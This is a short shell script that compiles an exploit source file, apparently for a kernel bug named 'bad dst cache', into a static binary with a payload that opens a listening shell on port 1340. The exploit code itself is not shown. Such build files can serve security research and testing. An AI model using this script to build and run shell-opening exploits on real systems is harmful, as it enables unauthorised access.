#!/bin/sh

CC=gcc

echo $CC

cd "$(dirname "$0")"

$CC exp_x86_clean.c -o bad_dst_cache_clean $(../../common/payload-flags --static --listening-shell --port 1340)
